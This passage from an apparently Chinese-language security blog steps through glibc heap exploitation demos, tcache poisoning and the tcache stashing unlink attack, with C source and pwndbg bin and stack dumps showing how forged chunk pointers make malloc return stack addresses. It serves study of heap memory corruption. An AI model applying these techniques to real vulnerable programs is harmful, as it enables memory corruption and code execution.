class="number">7f</span>432c2890b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7ffe02d9aa00</span></span><br></pre></td></tr></table></figure><h3 id="9-tcache-poisoning"><a href="#9-tcache-poisoning" class="headerlink" title="9. tcache_poisoning"></a>9. tcache_poisoning</h3><p>通过劫持修改  tcache fd 的形式来，来获取一个目标地址,  这里的目标是一个栈地址， 作用于 8 挺相似的</p><p>malloc 两个 chunk ，分别为 a 和 b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">21</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="number">23</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">  <span class="number">24</span> <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">► <span class="number">25</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br></pre></td></tr></table></figure><p>然后再一次将他们 free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">27</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">   <span class="number">28</span> <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">29</span> <span class="built_in">free</span>(b);</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x55ce97ce62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>就有如上的链表结构，假设我们可以溢出第一个 chunk，那么们就能修改第二个 chunk 的fd ,则我们将 chunk b 的fd 修改为栈地址,此时 tcachebins 就变成如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">   <span class="number">31</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">   <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="number">33</span>    <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">   <span class="number">34</span> b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"> ► <span class="number">35</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fff96c64620</span> —▸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rdx  <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fff96c64630</span> —▸ <span class="number">0x55ce97ce62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fff96c64638</span> —▸ <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fff96c64640</span> —▸ <span class="number">0x7fff96c64740</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fff96c64648</span> ◂— <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rbp  <span class="number">0x7fff96c64650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fff96c64658</span> —▸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>ce96f65343 main+<span class="number">314</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— ...</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们就发现 变成了 b —&gt; &amp;stack_var ,然后我们只需 malloc 两次就能将栈地址拿到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"> ► <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">42</span> <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line">   <span class="number">43</span></span><br><span class="line">   <span class="number">44</span> assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">   <span class="number">45</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">46</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fff96c64620</span> —▸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rax r8  <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fff96c64630</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fff96c64638</span> —▸ <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7fff96c64640</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7fff96c64648</span> ◂— <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rbp     <span class="number">0x7fff96c64650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fff96c64658</span> —▸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>ce96f653a3 main+<span class="number">410</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">6</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x7fff96c64628</span></span><br></pre></td></tr></table></figure><h3 id="10-tcache-stashing-unlink-attack"><a href="#10-tcache-stashing-unlink-attack" class="headerlink" title="10. tcache_stashing_unlink_attack"></a>10. tcache_stashing_unlink_attack</h3><p>tcache 上的 stashing unlink attack</p><p>当你能够覆盖victor-&gt;bk指针时，可以使用这个技术。此外，至少需要用calloc分配一个chunk。</p><p>在glibc中，将smallbin放入tcache的机制给了我们发动攻击的机会. 这种技术允许我们把libc addr写到任何我们想要的地方，并在任何需要的地方创建一个假的chunk。在这种情况下，我们将在堆栈上创建一个假的chunk.</p><p>例如此时我们在栈上伪造一个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">22</span>     stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx stack_var</span><br><span class="line"><span class="number">0x7fffea4571c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007fffea4571d0</span></span><br><span class="line"><span class="number">0x7fffea4571e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457200</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457210</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457220</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457230</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457240</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>首先让我们向 fake_chunk-&gt;bk 写一个可写的地址，以绕过 glibc 中的 bck-&gt;fd = bin。这里我们选择stack_var[2]的地址作为fake bk。之后我们可以看到*(fake_chunk-&gt;bk + 0x10)，也就是stack_var[4]在攻击后将成为libc addr</p><p>malloc 9 个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">30</span>         chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">31</span>     &#125;</span><br></pre></td></tr></table></figure><p>free 7 个chunk，填满 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">36</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">  <span class="number">37</span>         <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">  <span class="number">38</span>     &#125;</span><br><span class="line">  <span class="number">39</span></span><br><span class="line">► <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">41</span></span><br><span class="line">  <span class="number">42</span>     <span class="comment">//last tcache bin</span></span><br><span class="line">  <span class="number">43</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这个我们注意一下， tcache bin 的最后一个bin是  chunk_lis[1]</p><p>然后在 unsort bin 里放入两个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">44</span>     <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"> ► <span class="number">45</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">46</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">47</span></span><br><span class="line">     ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x55a4674bc340</span> —▸ <span class="number">0x55a4674bc7a0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后分配一个大于 0x90 的chunk ，这个时候 chunk0 和 chunk2 会被放入 smallbin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">49</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">50</span></span><br><span class="line">  <span class="number">51</span>     <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><p>然后，我再 malloc 两个 chunk ，从tcache bin 取出两个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span>: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后此时，我们假设有一个漏洞能修改 chunklis[2]的 bck</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">61</span>     <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">  <span class="number">62</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">► <span class="number">63</span>     chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">64</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">  <span class="number">65</span></span><br></pre></td></tr></table></figure><p>此时 bins 如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">BK: <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x7fffea4571c0</span> —▸ <span class="number">0x7fffea4571d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们 calloc 一个新 chunk ，此时将 chunk[0] (calloc 不会从 tcache 取)</p><p>smallbin 的chunk 会被重新填充到 tache bin里，然后我们可以通过 tcache 没有严格的检查，再将 fake chunk 取出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc700</span> ◂— <span class="number">0x0</span></span><br><span class="line">BK: <span class="number">0x7fffea4571d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_stashing_unlink_attack.c</span><br><span class="line">   <span class="number">71</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">   <span class="number">74</span>     target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> ► <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">   <span 